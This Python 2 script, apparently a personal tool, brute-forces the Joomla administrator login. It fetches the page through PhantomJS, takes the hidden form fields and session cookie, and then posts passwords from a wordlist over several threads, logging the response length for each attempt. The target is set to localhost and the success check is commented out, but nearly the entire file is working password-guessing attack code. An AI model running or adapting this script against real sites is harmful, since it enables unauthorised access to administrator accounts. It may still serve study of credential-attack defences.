# coding:utf-8
#!/usr/bin/env python
# @Date     :   2016年3月1日00:20:16
# @Author   :   pirogue (p1r06u3@gmail.com)
# @Link     :   http://www.pirogue.org

import sys
import urllib
import urllib2
# from PyQt4.QtCore import *
# from PyQt4.QtGui import *
# from PyQt4.QtWebKit import *
import cookielib
import threading
import Queue
import subprocess
# import spynner
from HTMLParser import HTMLParser

#简要设置
user_thread = 3
username = "admin"
wordlist_file = "./pi.txt"
resume = None

target_url = "http://127.0.0.1/joomla/administrator/index.php"
target_post = "http://127.0.0.1/joomla/administrator/index.php"

username_field = "username"
password_field = "passwd"

success_check = "Control Panel"

class BruteDom(object):
    """docstring for BruteDom"""
    def __init__(self, url):
        self.url = url        
    def getDom(self):
        cmd = 'phantomjs.exe ./web_bruter.js "%s" ' % self.url
        # print "cmd:", cmd
        stdout,stderr = subprocess.Popen(cmd,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
        print stderr
        return stdout

class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}
    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name,value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
                if tag_name is not None:
                    self.tag_results[tag_name] = value

class Bruter(object):
    # def __init__(self, username, words):
    #     self.username = username
    #     self.password_q = words
    #     self.found = False
    def __init__(self, username, password, strs):
        self.username = username
        self.password = password
        self.found = False
        self.strs = strs
        print "Finished setting up for: %s" % username

    def run_bruter(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password.empty() and not self.found:
            brute = self.password.get().rstrip()
            opener = urllib2.build_opener()
            page_cookie = self.strs.split(",")
            opener.addheaders.append(('Cookie',page_cookie[1].strip()))
            print "Trying: %s : %s (%d left)" % (self.username, brute, self.password.qsize())
            # 解析隐藏区域

            parser = BruteParser()
            parser.feed(page_cookie[0])
            post_tags = parser.tag_results
            # 添加我们的用户名和密码区域
            post_tags[username_field] = self.username
            post_tags[password_field] = brute
            #print brute
            login_data = urllib.urlencode(post_tags)
            # print login_data
            # print opener
            login_response = opener.open(target_post, login_data)
            # print login_response
            print brute + '|' + str(len(login_response.read()))
            # print len(login_result)
            # print login_result
            # if success_check in login_result:
            #     self.found = True

            #     print "[*] Bruteforce successful."
            #     print "[*] Username: %s" % username
            #     print "[*] Password: %s" % brute
            #     print "[*] Waiting for other threads to exit..."





def build_wordlist(wordlist_file):
    fd = open(wordlist_file, "rb")
    raw_words = fd.readlines()
    fd.close()

    found_resume = False
    words = Queue.Queue()
    for word in raw_words:
        word = word.rstrip()
        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print "Resuming wordlist from: %s" % resume
        else:
            words.put(word)
    return words


BruteDoms = BruteDom(target_url)
pages_cookies = BruteDoms.getDom()

words = build_wordlist(wordlist_file)

bruter_obj = Bruter(username, words, pages_cookies)
bruter_obj.run_bruter()





#url = 'https://passport.baidu.com/v2/?login'
# r = Render(url)
# html = r.frame.toHtml()
# print html.toUtf8()
